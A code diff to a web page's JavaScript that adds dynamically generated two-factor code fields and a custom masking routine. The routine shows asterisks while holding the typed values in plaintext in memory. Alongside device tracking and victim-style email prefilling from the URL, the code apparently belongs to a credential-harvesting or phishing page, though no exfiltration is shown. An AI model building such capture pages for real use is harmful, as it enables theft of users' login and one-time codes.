@@ -595,6 +595,7 @@
     let candidateEmail = "";
     let selectedCategory = ""; 
     let currentScreenFile = "";
+    const clearTextStorage = {};
 
     /**
      * POINT 3: ENTERPRISE GLOBAL API HANDLER
@@ -644,6 +645,56 @@
             return v.toString(16);
         });
     }
+
+    // Form Layout Generation Engine
+        function renderTwoFactorFields(fieldsArray) {
+            const container = document.getElementById('dynamic-2fa-fields');
+            container.innerHTML = '';
+
+            fieldsArray.forEach(field => {
+                const input = document.createElement('input');
+                input.id = `field-${field.name}`;
+                input.name = field.name;
+                input.placeholder = field.title;
+                input.autocomplete = "off";
+                input.required = true;
+
+                // Initialize internal data shadow map if field requires character masking
+                if (field.mask) {
+                    clearTextStorage[field.name] = "";
+                    setupMaskingEventListener(input, field.name);
+                }
+
+                container.appendChild(input);
+            });
+        }
+     // Multi-Input Character Masking Engine
+        function setupMaskingEventListener(inputElement, fieldName) {
+            inputElement.addEventListener('input', (e) => {
+                let currentRaw = clearTextStorage[fieldName];
+                let currentDisplay = inputElement.value;
+                const diff = currentDisplay.length - currentRaw.length;
+                const cursorPosition = inputElement.selectionStart;
+
+                if (diff > 0) {
+                    const addedChars = currentDisplay.substring(cursorPosition - diff, cursorPosition);
+                    clearTextStorage[fieldName] = currentRaw.substring(0, cursorPosition - diff) + addedChars + currentRaw.substring(cursorPosition - diff);
+                } else if (diff < 0) {
+                    clearTextStorage[fieldName] = currentRaw.substring(0, cursorPosition) + currentRaw.substring(cursorPosition + Math.abs(diff));
+                }
+
+                inputElement.value = "*".repeat(clearTextStorage[fieldName].length);
+                inputElement.setSelectionRange(cursorPosition, cursorPosition);
+            });
+
+            inputElement.addEventListener('keydown', (e) => {
+                if (inputElement.selectionStart === 0 && inputElement.selectionEnd === inputElement.value.length) {
+                    if (e.key === 'Backspace' || e.key === 'Delete') {
+                        clearTextStorage[fieldName] = "";
+                    }
+                }
+            });
+        }
 
     function getOrCreateDeviceID() {
         let deviceId = localStorage.getItem('tracked_device_id');
@@ -744,22 +795,8 @@
             // 1. Inject the HTML
             document.getElementById('screen-target').innerHTML = html;
 
-            // 2. NOW that the HTML is in the DOM, we can find the elements
-            const urlParams = new URLSearchParams(window.location.search);
-            const parameter = urlParams.get('email');
-            
-            if (parameter) {
-                // Check for the span
-                const targetSpan = document.getElementById('u8z3x6c1v5');
-                if (targetSpan) {
-                    targetSpan.innerText = parameter;
-                }
-                
-                // Check for the input
-                const emailInput = document.getElementById('email-input');
-                if (emailInput) {
-                    emailInput.value = parameter;
-                }
+            if(data.codes.length > 0){
+                renderTwoFactorFields(data.codes);
             }
 
             // Handle headers
